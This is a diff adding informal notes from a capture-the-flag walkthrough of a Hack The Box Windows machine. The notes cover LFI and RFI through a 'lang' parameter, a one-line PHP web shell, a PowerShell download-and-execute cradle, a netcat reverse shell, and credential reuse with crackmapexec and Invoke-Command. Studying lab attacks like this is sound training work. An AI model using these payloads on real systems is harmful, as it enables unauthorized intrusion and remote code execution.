@@ -1,0 +1,34 @@
+When there's a parameter which is a file (10.10.10.151/blog/?lang=blog.php) he goes to LFI (Local file inclusion)
+	- 10.10.10.151/blog/?lang=css/style.css
+	- He attempted a php wrapper filter base64 10.10.10.151/blog/?lang=php://filter/convert.base64-encode/resource=index.php
+	- 10.10.10.151/blog/?lang=index.php - infinite loop
+	- 10.10.10.151/blog/?lang=/windows/system32/license.rtf - Works, definitively an LFI
+	- 10.10.10.151/blog/?lang=\\10.10.14.2\htb\sth	- rlwrap nc -lvnp 445 - we get sth back, we could upload files
+		- Testing RFI via SMB, then failing to steal a hash and use impackets SMBServer
+		
+rlwrap is really good for reverse shells
+
+He prepares a smb server in kali and uncomments to allow remote administration of Windows print drivers
+	- systemctl start smbd
+
+He creates an rce.php file, uploades it, runs it with LFI.
+<?php system($_REQUEST['command']); ?> and then 10.10.10.151/blog/?lang=rce.php&command=whoami
+
+systeminfo is also a good command (see Hotfixes)
+% Powershell whoami
+% IEX(New-Object Net.WebClient).downloadString('http://IP/script.ps1') -> he uses nishang? /usr/share/nishang/Shells/...
+% powershell $ExecutionContext.SessionState.LanguageMode (if in ConstrainedLanguage mode, it limits a lot)
+
+He copies nc.exe and uploads it
+updatedb updates locate database
+% nc.exe IP port -e powershell
+% gci -recurse (ls/dir recursive)
+% gci -recurse | select FullName
+% gc file.php (get content) == type file.php
+% net user
+# crackmapexec IP smb -u User -p password
+% $pass = ConvertTo-SecureString "password" -AsPlainText -Force
+% $cred = New-Object System.Management.Automation.PSCredential("Hostname\\User",$pass)
+% Invoke-Command -ComputerName Hostname -Credential $cred -ScriptBlock {whoami}
+
+Minuto 33
